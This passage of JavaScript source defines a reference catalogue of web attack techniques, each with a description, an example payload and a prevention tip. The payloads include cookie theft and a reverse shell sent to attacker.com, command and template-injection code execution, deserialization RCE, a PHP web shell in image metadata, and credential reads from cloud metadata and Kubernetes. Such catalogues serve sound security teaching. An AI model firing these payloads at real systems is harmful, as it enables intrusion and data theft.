  { name: "Boolean-Based Blind SQLi", category: "Injection", description: "Infers data by observing application response differences between true and false conditions", payload: "' AND 1=1-- (true) vs ' AND 1=2-- (false)", prevention: "Input validation and parameterized queries" },
  { name: "Time-Based Blind SQLi", category: "Injection", description: "Uses time delay functions to infer data when no visible output difference exists", payload: "' AND SLEEP(5)-- or '; WAITFOR DELAY '0:0:5'--", prevention: "Parameterized queries with strict input validation" },
  { name: "Error-Based SQL Injection", category: "Injection", description: "Extracts data through database error messages that reveal information about the query structure", payload: "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version())))--", prevention: "Custom error pages and parameterized queries" },
  { name: "Stacked Queries SQLi", category: "Injection", description: "Executes multiple SQL statements separated by semicolons to perform additional malicious operations", payload: "'; DROP TABLE users;--", prevention: "Disable multi-statement execution where possible" },
  { name: "Out-of-Band SQL Injection", category: "Injection", description: "Exfiltrates data through DNS or HTTP requests when in-band extraction is not possible", payload: "'; EXEC xp_dirtree '\\\\attacker.com\\share'--", prevention: "Network egress filtering and parameterized queries" },
  { name: "Second-Order SQL Injection", category: "Injection", description: "Stores a malicious payload that is later incorporated into a SQL query in a different context", payload: "Register with username: admin'-- then trigger profile update", prevention: "Sanitize all data at point of use, not just at input" },

  // -- XSS variants --
  { name: "Reflected XSS", category: "XSS", description: "Injects malicious script through URL parameters that is reflected back in the page response", payload: "<script>document.location='http://attacker.com/?c='+document.cookie</script>", prevention: "Output encoding and Content Security Policy" },
  { name: "Stored XSS", category: "XSS", description: "Persists malicious script in the application database, executing for every user who views the affected page", payload: "<img src=x onerror=fetch('http://attacker.com/?c='+document.cookie)>", prevention: "Input sanitization, output encoding, and CSP" },
  { name: "DOM-Based XSS", category: "XSS", description: "Exploits client-side JavaScript that processes user input and writes it to the DOM without proper sanitization", payload: "javascript:alert(document.domain) in fragment or input", prevention: "Avoid innerHTML; use textContent or sanitization libraries" },
  { name: "XSS via SVG", category: "XSS", description: "Embeds JavaScript within SVG files or inline SVG elements that execute when rendered", payload: "<svg onload=alert(1)> or <svg><script>alert(1)</script></svg>", prevention: "Sanitize SVG uploads and strip script elements" },
  { name: "XSS via Event Handlers", category: "XSS", description: "Uses HTML event handler attributes to execute JavaScript without script tags", payload: "<img src=x onerror=alert(1)> or <body onload=alert(1)>", prevention: "Strip event handler attributes and use CSP" },
  { name: "Mutation XSS (mXSS)", category: "XSS", description: "Exploits differences between how HTML is parsed and how sanitizers process it", payload: "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">", prevention: "Use DOMPurify with latest updates" },
  { name: "Polyglot XSS", category: "XSS", description: "Crafts payloads that work across multiple contexts (HTML, JS, attributes) simultaneously", payload: "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert())//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e", prevention: "Context-aware output encoding" },

  // -- Command Injection --
  { name: "OS Command Injection (Semicolon)", category: "Command Injection", description: "Appends a second command using semicolons to execute arbitrary OS commands", payload: "; cat /etc/passwd", prevention: "Avoid system calls; use language-native APIs" },
  { name: "OS Command Injection (Pipe)", category: "Command Injection", description: "Pipes output of the intended command into a malicious command", payload: "| nc attacker.com 4444 -e /bin/sh", prevention: "Input validation and avoid shell execution" },
  { name: "OS Command Injection (Backticks)", category: "Command Injection", description: "Uses backtick command substitution to inject commands within another command", payload: "`whoami`", prevention: "Never pass user input to shell interpreters" },
  { name: "OS Command Injection ($(...))", category: "Command Injection", description: "Uses dollar-sign parenthesis command substitution for command injection", payload: "$(cat /etc/passwd)", prevention: "Use subprocess with array arguments, not shell=True" },
  { name: "Blind Command Injection (Time)", category: "Command Injection", description: "Confirms command execution through time delays when output is not visible", payload: "; sleep 10", prevention: "Allowlist valid input characters" },
  { name: "Blind Command Injection (OOB)", category: "Command Injection", description: "Exfiltrates command output through DNS or HTTP requests to an attacker-controlled server", payload: "; curl http://attacker.com/$(whoami)", prevention: "Network egress filtering and input sanitization" },

  // -- Path Traversal --
  { name: "Basic Path Traversal", category: "Path Traversal", description: "Uses dot-dot-slash sequences to navigate up the directory tree and access files outside the intended directory", payload: "../../../../etc/passwd", prevention: "Canonicalize paths and validate against allowlist" },
  { name: "URL-Encoded Path Traversal", category: "Path Traversal", description: "Bypasses basic filters by URL-encoding traversal characters", payload: "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", prevention: "Decode before validation; use canonical path comparison" },
  { name: "Double-Encoded Path Traversal", category: "Path Traversal", description: "Uses double URL encoding to bypass filters that only decode once", payload: "%252e%252e%252f%252e%252e%252fetc%252fpasswd", prevention: "Apply decoding recursively before path validation" },
  { name: "Null Byte Path Traversal", category: "Path Traversal", description: "Uses null bytes to truncate file extensions and bypass extension filters", payload: "../../../../etc/passwd%00.jpg", prevention: "Strip null bytes and validate the full resolved path" },
  { name: "Windows Path Traversal", category: "Path Traversal", description: "Uses Windows-specific path separators and syntax for directory traversal", payload: "..\\..\\..\\windows\\system32\\config\\sam", prevention: "Normalize path separators and validate against root" },

  // -- Authentication Attacks --
  { name: "Credential Stuffing", category: "Authentication", description: "Automates login attempts using large lists of credentials obtained from previous data breaches", payload: "Automated login with breach databases (Collection #1-5)", prevention: "MFA, rate limiting, breach password detection" },
  { name: "Password Spraying", category: "Authentication", description: "Attempts a few commonly used passwords against many accounts to avoid lockout thresholds", payload: "Try 'Password123!' against all discovered usernames", prevention: "Account lockout policies, MFA, and anomaly detection" },
  { name: "Brute Force Attack", category: "Authentication", description: "Systematically tries all possible password combinations until the correct one is found", payload: "Hydra: hydra -l admin -P wordlist.txt target http-post-form", prevention: "Account lockout, rate limiting, CAPTCHA, MFA" },
  { name: "Session Hijacking", category: "Authentication", description: "Steals or predicts a valid session token to impersonate an authenticated user", payload: "Steal session cookie via XSS or network sniffing", prevention: "Secure cookie flags, HTTPS, session rotation" },
  { name: "Session Fixation", category: "Authentication", description: "Forces a user to use a known session ID by setting it before authentication", payload: "Set PHPSESSID cookie before victim logs in", prevention: "Regenerate session ID after successful authentication" },
  { name: "JWT None Algorithm", category: "Authentication", description: "Exploits JWT implementations that accept the 'none' algorithm, allowing forged tokens", payload: "Change JWT header alg to 'none' and remove signature", prevention: "Reject 'none' algorithm; validate alg against allowlist" },
  { name: "JWT Key Confusion", category: "Authentication", description: "Exploits RS256/HS256 confusion to sign tokens with the public key as HMAC secret", payload: "Change alg from RS256 to HS256, sign with RSA public key", prevention: "Enforce expected algorithm server-side" },
  { name: "JWT Secret Brute Force", category: "Authentication", description: "Brute forces weak JWT signing secrets to forge arbitrary tokens", payload: "hashcat -a 0 -m 16500 jwt.txt wordlist.txt", prevention: "Use long, random secrets (256+ bits of entropy)" },

  // -- CSRF --
  { name: "CSRF via Form POST", category: "CSRF", description: "Tricks a user into submitting a malicious form that performs an action on a target site using their session", payload: "<form action='https://target.com/change-email' method='POST'><input name='email' value='attacker@evil.com'></form><script>document.forms[0].submit()</script>", prevention: "Anti-CSRF tokens, SameSite cookies" },
  { name: "CSRF via Image Tag", category: "CSRF", description: "Triggers a GET-based state change by embedding the malicious URL as an image source", payload: "<img src='https://target.com/api/delete?id=123'>", prevention: "Never use GET for state-changing operations" },
  { name: "CSRF Token Bypass via Subdomain", category: "CSRF", description: "Exploits XSS on a subdomain to extract CSRF tokens from the main domain", payload: "XSS on sub.target.com reads CSRF token from target.com", prevention: "Scope cookies tightly; isolate subdomains" },
  { name: "Login CSRF", category: "CSRF", description: "Forces a victim to authenticate as the attacker, allowing tracking of their actions", payload: "Auto-submit login form with attacker credentials", prevention: "CSRF protection on login forms" },

  // -- SSRF --
  { name: "SSRF to Cloud Metadata", category: "SSRF", description: "Accesses cloud provider metadata endpoints to steal credentials and configuration", payload: "http://169.254.169.254/latest/meta-data/iam/security-credentials/", prevention: "Block metadata IP; use IMDSv2 with token requirement" },
  { name: "SSRF via DNS Rebinding", category: "SSRF", description: "Bypasses SSRF protections by having a DNS name resolve to an internal IP after initial validation", payload: "Domain resolves to public IP during check, then 127.0.0.1", prevention: "Re-resolve DNS at request time; pin resolved IP" },
  { name: "SSRF via URL Redirect", category: "SSRF", description: "Chains an open redirect with SSRF to bypass domain allowlists", payload: "http://allowed.com/redirect?url=http://169.254.169.254/", prevention: "Do not follow redirects in server-side requests" },
  { name: "SSRF via Protocol Smuggling", category: "SSRF", description: "Uses alternative URL schemes to interact with internal services", payload: "gopher://127.0.0.1:6379/_SET%20key%20value", prevention: "Restrict to http/https schemes only" },
  { name: "Blind SSRF", category: "SSRF", description: "Exploits server-side requests without seeing the response, confirmed via timing or out-of-band channels", payload: "Request to attacker-controlled server to confirm execution", prevention: "Network segmentation and egress filtering" },

  // -- XXE --
  { name: "Classic XXE", category: "XXE", description: "Exploits XML parsers that process external entity declarations to read local files", payload: "<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>", prevention: "Disable DTD processing and external entities" },
  { name: "Blind XXE via OOB", category: "XXE", description: "Exfiltrates data through out-of-band channels when direct response is not available", payload: "<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://attacker.com/?data=...'>]>", prevention: "Disable external entities; use JSON instead of XML" },
  { name: "XXE via File Upload", category: "XXE", description: "Exploits XML processing in file upload handlers (DOCX, XLSX, SVG contain XML)", payload: "Upload SVG with XXE payload in its XML structure", prevention: "Validate and sanitize uploaded XML-based file formats" },
  { name: "XXE via SOAP", category: "XXE", description: "Injects XXE payloads into SOAP request bodies that are parsed as XML", payload: "Inject DOCTYPE with entity in SOAP envelope body", prevention: "Configure SOAP parsers to disable DTDs" },

  // -- Deserialization --
  { name: "Java Deserialization (Commons Collections)", category: "Deserialization", description: "Exploits Java object deserialization with gadget chains in Apache Commons Collections", payload: "ysoserial CommonsCollections1 'command'", prevention: "Avoid deserializing untrusted data; use allowlists" },
  { name: "PHP Object Injection", category: "Deserialization", description: "Exploits PHP unserialize() on user input to trigger magic methods (__wakeup, __destruct)", payload: "O:8:\"Malclass\":1:{s:4:\"cmd\";s:6:\"whoami\";}", prevention: "Use json_decode instead of unserialize for user data" },
  { name: "Python Pickle RCE", category: "Deserialization", description: "Exploits Python pickle.loads() on untrusted data to execute arbitrary code via __reduce__", payload: "cos\\nsystem\\n(S'command'\\ntR.", prevention: "Never unpickle untrusted data; use JSON" },
  { name: ".NET Deserialization (BinaryFormatter)", category: "Deserialization", description: "Exploits .NET BinaryFormatter deserialization to achieve remote code execution", payload: "ysoserial.net -f BinaryFormatter -g TypeConfuseDelegate -c command", prevention: "Use DataContractSerializer or JSON serialization" },
  { name: "Node.js node-serialize RCE", category: "Deserialization", description: "Exploits the node-serialize package which uses eval() during deserialization", payload: "{\"rce\":\"_$$ND_FUNC$$_function(){require('child_process').exec('command')}()\"}", prevention: "Use JSON.parse instead of node-serialize" },

  // -- File Upload --
  { name: "Unrestricted File Upload", category: "File Upload", description: "Uploads a web shell or executable by bypassing file type restrictions", payload: "Upload shell.php with Content-Type: image/jpeg", prevention: "Validate file type server-side; store outside webroot" },
  { name: "Double Extension Upload", category: "File Upload", description: "Uses double extensions to bypass extension checks while maintaining execution", payload: "shell.php.jpg or shell.php%00.jpg", prevention: "Check the last extension; rename files on upload" },
  { name: "MIME Type Bypass", category: "File Upload", description: "Changes the Content-Type header to bypass MIME-based file validation", payload: "Set Content-Type to image/png but upload PHP file", prevention: "Verify file content with magic bytes, not just headers" },
  { name: "Image File with Embedded Code", category: "File Upload", description: "Hides executable code within valid image file metadata or comments", payload: "Embed PHP in EXIF data of JPEG: exiftool -Comment='<?php system($_GET[c]); ?>' img.jpg", prevention: "Strip metadata from uploads; serve from separate domain" },
  { name: "SVG Upload XSS", category: "File Upload", description: "Uploads SVG files containing embedded JavaScript that executes when viewed", payload: "<svg><script>alert(document.cookie)</script></svg>", prevention: "Sanitize SVG files; serve with Content-Disposition: attachment" },
  { name: "ZIP Slip", category: "File Upload", description: "Exploits archive extraction to write files outside the intended directory using path traversal in filenames", payload: "Create ZIP with entry named ../../webroot/shell.php", prevention: "Validate extracted file paths against destination directory" },

  // -- LDAP Injection --
  { name: "LDAP Injection (Authentication Bypass)", category: "Injection", description: "Manipulates LDAP queries to bypass authentication by altering filter logic", payload: "*)(&) or admin)(&)(password=*", prevention: "Escape LDAP special characters in user input" },
  { name: "LDAP Injection (Information Disclosure)", category: "Injection", description: "Modifies LDAP search filters to enumerate directory information", payload: "*)(uid=*))(|(uid=*", prevention: "Use parameterized LDAP queries where available" },

  // -- Template Injection --
  { name: "Jinja2 SSTI", category: "Template Injection", description: "Exploits server-side template injection in Jinja2 to execute Python code", payload: "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}", prevention: "Use sandboxed templates; never render user input as template" },
  { name: "Twig SSTI", category: "Template Injection", description: "Exploits PHP Twig template engine to execute arbitrary code", payload: "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}", prevention: "Sandbox templates and disable dangerous functions" },
  { name: "Freemarker SSTI", category: "Template Injection", description: "Exploits Java Freemarker template injection for code execution", payload: "<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}", prevention: "Restrict template built-ins and disable new()" },
  { name: "ERB SSTI (Ruby)", category: "Template Injection", description: "Exploits Ruby ERB templates to execute arbitrary Ruby code", payload: "<%= system('whoami') %> or <%= `id` %>", prevention: "Never pass user input directly to ERB.new" },
  { name: "Pug/Jade SSTI", category: "Template Injection", description: "Exploits Node.js Pug template engine for remote code execution", payload: "#{global.process.mainModule.require('child_process').execSync('id')}", prevention: "Avoid passing user input as template source" },

  // -- NoSQL Injection --
  { name: "MongoDB Operator Injection", category: "Injection", description: "Injects MongoDB query operators to bypass authentication or extract data", payload: "{\"username\":{\"$gt\":\"\"}, \"password\":{\"$gt\":\"\"}}", prevention: "Validate input types; reject objects where strings expected" },
  { name: "MongoDB $where Injection", category: "Injection", description: "Injects JavaScript into MongoDB $where clauses for arbitrary query manipulation", payload: "'; return true; var x='", prevention: "Avoid $where; use standard query operators" },
  { name: "MongoDB $regex DoS", category: "Injection", description: "Uses complex regular expressions in MongoDB queries to cause denial of service", payload: "{\"username\":{\"$regex\":\"^(a+)+$\"}}", prevention: "Sanitize regex input; limit query execution time" },

  // -- GraphQL Attacks --
  { name: "GraphQL Introspection Abuse", category: "API", description: "Uses introspection queries to discover the full API schema including hidden fields and mutations", payload: "{__schema{types{name,fields{name,args{name,type{name}}}}}}", prevention: "Disable introspection in production" },
  { name: "GraphQL Batching Attack", category: "API", description: "Sends multiple queries in a single request to bypass rate limiting", payload: "[{\"query\":\"mutation{login(u:\\\"a\\\",p:\\\"1\\\")}\"},...repeat 1000x]", prevention: "Limit batch size; rate limit per operation" },
  { name: "GraphQL Depth Attack", category: "API", description: "Sends deeply nested queries to exhaust server resources (DoS)", payload: "{user{friends{friends{friends{friends{...}}}}}}", prevention: "Implement query depth limiting" },

  // -- Race Conditions --
  { name: "TOCTOU Race Condition", category: "Race Condition", description: "Exploits time gap between a security check and the use of the checked resource", payload: "Rapidly send concurrent requests to transfer funds exceeding balance", prevention: "Use atomic operations and database transactions" },
  { name: "Double Spending", category: "Race Condition", description: "Sends concurrent requests to spend the same resource multiple times before balance updates", payload: "Parallel POST requests to /transfer with same source account", prevention: "Use pessimistic locking or serializable transactions" },
  { name: "Coupon Reuse Race", category: "Race Condition", description: "Redeems a single-use coupon multiple times by sending concurrent redemption requests", payload: "Send 100 parallel requests to /redeem-coupon with same code", prevention: "Use database unique constraints and row-level locks" },

  // -- Prototype Pollution --
  { name: "JavaScript Prototype Pollution", category: "Prototype Pollution", description: "Modifies Object.prototype through unsafe merge/extend operations to inject properties into all objects", payload: "{\"__proto__\":{\"isAdmin\":true}} or {\"constructor\":{\"prototype\":{\"isAdmin\":true}}}", prevention: "Use Object.create(null); validate keys; freeze prototypes" },
  { name: "Prototype Pollution via Query String", category: "Prototype Pollution", description: "Pollutes prototypes through query string parsing libraries that create nested objects", payload: "?__proto__[isAdmin]=true or ?constructor.prototype.isAdmin=true", prevention: "Use qs with proper options; filter dangerous keys" },

  // -- Cache Poisoning --
  { name: "Web Cache Poisoning", category: "Cache Poisoning", description: "Manipulates caching behavior to serve malicious content to other users via unkeyed inputs", payload: "X-Forwarded-Host: attacker.com (reflected in cached response)", prevention: "Include all significant headers in cache keys" },
  { name: "Cache Deception", category: "Cache Poisoning", description: "Tricks the cache into storing sensitive responses by appending cacheable extensions to URLs", payload: "/account/settings/nonexistent.css (cached as static file)", prevention: "Cache based on Content-Type; use Cache-Control headers" },

  // -- HTTP Smuggling --
  { name: "HTTP Request Smuggling (CL.TE)", category: "HTTP Smuggling", description: "Exploits discrepancies between Content-Length and Transfer-Encoding header processing between front-end and back-end servers", payload: "Content-Length: 13\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n0\\r\\n\\r\\nGET /admin", prevention: "Use HTTP/2 end-to-end; normalize request parsing" },
  { name: "HTTP Request Smuggling (TE.CL)", category: "HTTP Smuggling", description: "Front-end uses Transfer-Encoding while back-end uses Content-Length", payload: "Transfer-Encoding: chunked\\r\\nContent-Length: 3\\r\\n\\r\\n1\\r\\nG\\r\\n0\\r\\n\\r\\n", prevention: "Reject ambiguous requests; use consistent HTTP parsing" },
  { name: "HTTP Response Splitting", category: "HTTP Smuggling", description: "Injects CRLF characters into HTTP headers to split responses and inject content", payload: "Header: value\\r\\n\\r\\n<html>Injected content</html>", prevention: "Sanitize header values; reject CRLF in input" },

  // -- DNS Attacks --
  { name: "DNS Rebinding", category: "Network", description: "Manipulates DNS resolution to bypass same-origin policy and access internal services through a victim's browser", payload: "Attacker domain TTL=0, alternates between public and internal IP", prevention: "Validate Host headers; use DNS pinning" },
  { name: "DNS Zone Transfer", category: "Network", description: "Exploits misconfigured DNS servers to download the entire zone file containing all DNS records", payload: "dig axfr @ns.target.com target.com", prevention: "Restrict zone transfers to authorized secondary nameservers" },
  { name: "DNS Tunneling", category: "Network", description: "Encodes data in DNS queries and responses to exfiltrate data or create covert communication channels", payload: "dnscat2 or iodine for DNS tunneling", prevention: "Monitor DNS query patterns; restrict DNS resolvers" },

  // -- Subdomain Takeover --
  { name: "Subdomain Takeover (CNAME)", category: "Subdomain Takeover", description: "Claims an abandoned cloud service that a subdomain's CNAME record still points to", payload: "sub.target.com CNAME -> deleted-app.herokuapp.com (claim it)", prevention: "Audit DNS records; remove stale CNAME entries" },
  { name: "Subdomain Takeover (NS)", category: "Subdomain Takeover", description: "Claims control of a subdomain by registering the nameserver domain it delegates to", payload: "sub.target.com NS -> ns.expired-domain.com (register it)", prevention: "Monitor NS delegations; remove orphaned records" },

  // -- CORS Misconfiguration --
  { name: "CORS Wildcard with Credentials", category: "CORS", description: "Exploits APIs that reflect the Origin header and allow credentials, enabling cross-origin data theft", payload: "Origin: https://attacker.com (reflected in Access-Control-Allow-Origin with credentials)", prevention: "Never reflect arbitrary origins with credentials; use allowlist" },
  { name: "CORS Null Origin", category: "CORS", description: "Exploits APIs that allow the null origin, which can be triggered from sandboxed iframes", payload: "Sandboxed iframe sends request with Origin: null", prevention: "Do not allowlist the null origin" },

  // -- WebSocket Attacks --
  { name: "WebSocket Hijacking (CSWSH)", category: "WebSocket", description: "Exploits WebSocket handshakes that lack proper origin validation, similar to CSRF", payload: "Cross-site WebSocket connection from attacker page", prevention: "Validate Origin header in WebSocket handshake" },
  { name: "WebSocket Injection", category: "WebSocket", description: "Injects malicious messages into WebSocket connections that lack input validation", payload: "Send crafted WebSocket message with XSS or SQLi payload", prevention: "Validate and sanitize all WebSocket message data" },

  // -- OAuth/OIDC Attacks --
  { name: "OAuth Redirect URI Manipulation", category: "OAuth", description: "Manipulates the redirect_uri parameter to steal authorization codes or tokens", payload: "redirect_uri=https://attacker.com/callback", prevention: "Exact match redirect_uri validation; no wildcards" },
  { name: "OAuth CSRF (Missing State)", category: "OAuth", description: "Exploits missing state parameter to perform CSRF attacks on the OAuth flow", payload: "Initiate OAuth flow without state, then use victim's code", prevention: "Always use and validate the state parameter" },
  { name: "OAuth Token Theft via Referrer", category: "OAuth", description: "Steals access tokens from URL fragments via Referer header leakage", payload: "Link from callback page leaks token in Referer header", prevention: "Use authorization code flow; strip tokens from URLs" },
  { name: "OpenID Connect ID Token Manipulation", category: "OAuth", description: "Forges or tampers with ID tokens when signature validation is insufficient", payload: "Modify claims in ID token and exploit weak validation", prevention: "Always validate ID token signatures and claims" },

  // -- Email Attacks --
  { name: "Email Header Injection", category: "Injection", description: "Injects additional email headers via user input to send spam or manipulate recipients", payload: "attacker@example.com%0ABcc:victim@target.com", prevention: "Sanitize input for CRLF characters in email fields" },
  { name: "SMTP Injection", category: "Injection", description: "Injects SMTP commands into email sending functionality to manipulate mail server behavior", payload: "user@example.com\\r\\nRCPT TO:<victim@target.com>", prevention: "Use email libraries that sanitize addresses" },

  // -- Clickjacking --
  { name: "Classic Clickjacking", category: "Clickjacking", description: "Overlays a transparent iframe over a decoy page to trick users into clicking hidden elements", payload: "<iframe src='https://target.com/delete-account' style='opacity:0;position:absolute;'>", prevention: "X-Frame-Options: DENY or CSP frame-ancestors 'none'" },
  { name: "Cursorjacking", category: "Clickjacking", description: "Manipulates the visible cursor position to make users click unintended targets", payload: "CSS cursor offset with hidden actual click target", prevention: "X-Frame-Options and UI design with confirmation steps" },

  // -- Business Logic --
  { name: "Price Manipulation", category: "Business Logic", description: "Modifies price parameters in client-side requests to purchase items at lower prices", payload: "Change price=100.00 to price=0.01 in POST request", prevention: "Calculate prices server-side; validate against catalog" },
  { name: "Quantity Manipulation", category: "Business Logic", description: "Uses negative quantities or extreme values to manipulate order totals", payload: "quantity=-1 to get refund credit, or quantity=999999999", prevention: "Validate quantity bounds server-side" },
  { name: "Workflow Bypass", category: "Business Logic", description: "Skips steps in a multi-step process by directly accessing later stages", payload: "Skip payment step by directly accessing order confirmation", prevention: "Enforce server-side state machine for multi-step workflows" },
  { name: "Feature Abuse", category: "Business Logic", description: "Abuses legitimate features in unintended ways for malicious purposes", payload: "Use password reset to enumerate valid email addresses", prevention: "Rate limiting and generic responses for all outcomes" },
  { name: "Mass Assignment", category: "Business Logic", description: "Modifies object properties that should not be user-controllable by including extra fields in requests", payload: "{\"username\":\"user\",\"role\":\"admin\",\"approved\":true}", prevention: "Use allowlists for assignable properties" },

  // -- Information Disclosure --
  { name: "Source Code Disclosure", category: "Information Disclosure", description: "Accesses application source code through misconfigured servers or backup files", payload: "/.git/HEAD, /backup.zip, /app.js.bak, /.env", prevention: "Restrict access to sensitive files and directories" },
  { name: "Stack Trace Disclosure", category: "Information Disclosure", description: "Triggers error conditions that reveal stack traces with internal paths and library versions", payload: "Send malformed input to trigger unhandled exceptions", prevention: "Custom error pages; log details server-side only" },
  { name: "Directory Listing", category: "Information Disclosure", description: "Exploits enabled directory listing to enumerate all files in web-accessible directories", payload: "Browse to /images/ or /uploads/ to see all files", prevention: "Disable directory listing in web server configuration" },
  { name: "Sensitive Data in URL", category: "Information Disclosure", description: "Extracts sensitive data (tokens, passwords) passed in URL query parameters", payload: "Check browser history, Referer headers, and server logs for tokens", prevention: "Pass sensitive data in request body or headers, never URLs" },
  { name: "Git Repository Exposure", category: "Information Disclosure", description: "Downloads the .git directory to reconstruct the entire source code repository", payload: "wget --mirror https://target.com/.git/ then git checkout .", prevention: "Block access to .git directory; use .htaccess or nginx config" },
  { name: "Backup File Discovery", category: "Information Disclosure", description: "Discovers backup files left on the server that may contain source code or credentials", payload: "Check for .bak, .old, .swp, ~, .orig file extensions", prevention: "Remove backup files from web-accessible directories" },

  // -- Denial of Service --
  { name: "ReDoS (Regular Expression DoS)", category: "DoS", description: "Submits input that causes catastrophic backtracking in poorly constructed regular expressions", payload: "aaaaaaaaaaaaaaaaaaaaaaaaaaa! against ^(a+)+$", prevention: "Use linear-time regex engines; limit input length" },
  { name: "Hash Collision DoS (HashDoS)", category: "DoS", description: "Sends many values with identical hash codes to degrade hash table performance from O(1) to O(n)", payload: "Submit thousands of keys that hash to the same bucket", prevention: "Use randomized hash functions; limit POST parameter count" },
  { name: "XML Bomb (Billion Laughs)", category: "DoS", description: "Uses recursive XML entity definitions to exponentially expand memory usage", payload: "<!DOCTYPE lolz [<!ENTITY lol 'lol'><!ENTITY lol2 '&lol;&lol;&lol;...'>...]>", prevention: "Disable DTDs; limit entity expansion; cap XML size" },
  { name: "Zip Bomb", category: "DoS", description: "Creates a small compressed file that expands to enormous size when decompressed", payload: "42.zip (42KB compressed, 4.5PB decompressed)", prevention: "Limit decompressed size; check compression ratio" },
  { name: "Slowloris", category: "DoS", description: "Keeps many HTTP connections open by sending partial requests, exhausting server connection pool", payload: "Send HTTP headers slowly, never completing the request", prevention: "Set connection timeouts; use reverse proxy with buffering" },
  { name: "HTTP Slow POST", category: "DoS", description: "Sends POST body data at extremely slow rates to keep connections occupied", payload: "Content-Length: 100000, send 1 byte per 100 seconds", prevention: "Set minimum data rate thresholds; timeout slow requests" },

  // -- Insecure Direct Object Reference (IDOR) --
  { name: "IDOR via Sequential IDs", category: "IDOR", description: "Accesses other users' resources by incrementing or decrementing sequential numeric identifiers", payload: "/api/invoices/1001 -> /api/invoices/1002", prevention: "Use UUIDs; implement authorization checks on every access" },
  { name: "IDOR via Predictable Filenames", category: "IDOR", description: "Accesses other users' files by predicting the naming pattern used for uploaded files", payload: "/uploads/user_1001_avatar.jpg -> /uploads/user_1002_avatar.jpg", prevention: "Use random filenames; check file ownership on access" },
  { name: "IDOR in API Endpoints", category: "IDOR", description: "Accesses or modifies other users' data through API endpoints that use object references without authorization", payload: "PUT /api/users/other-user-id/settings with modified data", prevention: "Verify resource ownership in every API handler" },

  // -- Host Header Attacks --
  { name: "Host Header Injection", category: "Host Header", description: "Manipulates the Host header to poison password reset links and web cache", payload: "Host: attacker.com (password reset link uses this host)", prevention: "Validate Host header against allowlist" },
  { name: "Host Header SSRF", category: "Host Header", description: "Uses the Host header to route requests to internal services via reverse proxy misconfiguration", payload: "Host: internal-service.local", prevention: "Configure reverse proxy to only route known hosts" },

  // -- Open Redirect --
  { name: "Open Redirect via Parameter", category: "Open Redirect", description: "Redirects users to malicious sites through unvalidated redirect URL parameters", payload: "/redirect?url=https://attacker.com/phishing", prevention: "Validate redirect URLs against an allowlist of domains" },
  { name: "Open Redirect via Path", category: "Open Redirect", description: "Uses path-based redirects with protocol-relative URLs or special characters", payload: "/redirect/https://attacker.com or //attacker.com", prevention: "Parse and validate the full URL before redirecting" },

  // -- WordPress / CMS Attacks --
  { name: "WordPress XML-RPC Brute Force", category: "CMS", description: "Abuses XML-RPC system.multicall to test hundreds of passwords in a single request", payload: "POST /xmlrpc.php with system.multicall containing multiple wp.getUsersBlogs", prevention: "Disable XML-RPC or use plugin to block multicall" },
  { name: "WordPress REST API User Enumeration", category: "CMS", description: "Enumerates WordPress users through the REST API endpoint that lists user information", payload: "GET /wp-json/wp/v2/users", prevention: "Restrict the users endpoint; use security plugin" },
  { name: "WordPress Plugin Exploit", category: "CMS", description: "Exploits known vulnerabilities in outdated or poorly coded WordPress plugins", payload: "Target specific CVEs in popular plugins (Contact Form 7, Elementor, etc.)", prevention: "Keep plugins updated; remove unused plugins" },

  // -- Container/Cloud Attacks --
  { name: "Container Escape via Privileged Mode", category: "Container", description: "Escapes a privileged Docker container to access the host system", payload: "mount /dev/sda1 /mnt; chroot /mnt", prevention: "Never run containers in privileged mode in production" },
  { name: "Kubernetes Service Account Token Theft", category: "Container", description: "Reads the default service account token mounted in Kubernetes pods to access the API", payload: "cat /var/run/secrets/kubernetes.io/serviceaccount/token", prevention: "Disable auto-mounting; use RBAC with least privilege" },
  { name: "S3 Bucket Enumeration", category: "Cloud", description: "Discovers and accesses misconfigured public S3 buckets containing sensitive data", payload: "aws s3 ls s3://company-backups --no-sign-request", prevention: "Enable S3 Block Public Access; audit bucket policies" },
  { name: "AWS IAM Role Chaining", category: "Cloud", description: "Escalates privileges by assuming roles that have broader permissions than the initial credentials", payload: "aws sts assume-role --role-arn arn:aws:iam::role/AdminRole", prevention: "Implement least privilege; restrict AssumeRole trust policies" },
  { name: "Azure Managed Identity Abuse", category: "Cloud", description: "Abuses Azure managed identities to access cloud resources from compromised compute instances", payload: "curl 'http://169.254.169.254/metadata/identity/oauth2/token?resource=https://management.azure.com/' -H Metadata:true", prevention: "Restrict managed identity permissions; monitor token usage" },
];

// ---------------------------------------------------------------------------
// 3. COMMON VULNERABILITIES (80+ vulnerability types)
// ---------------------------------------------------------------------------

const COMMON_VULNS = [
  { name: "SQL Injection", severity: "Critical", description: "Untrusted data is sent to an interpreter as part of a command or query, allowing attackers to execute unintended commands or access unauthorized data", detection: "Input single quotes, UNION SELECT, OR 1=1 in all input fields; use SQLMap for automated detection", exploitation: "Extract database schema, dump tables, read/write files, execute OS commands via xp_cmdshell or INTO OUTFILE", remediation: "Use parameterized queries (prepared statements) for all database interactions; implement input validation and least-privilege database accounts" },
  { name: "Cross-Site Scripting (XSS)", severity: "High", description: "Application includes untrusted data in web pages without proper validation or escaping, allowing attackers to execute scripts in victims' browsers", detection: "Inject <script>alert(1)</script> in inputs; check for reflected, stored, and DOM-based variants; use browser developer tools", exploitation: "Steal session cookies, redirect users, deface pages, keylog credentials, perform actions on behalf of victim", remediation: "Context-aware output encoding (HTML, JS, URL, CSS); implement Content Security Policy; use frameworks with auto-escaping" },
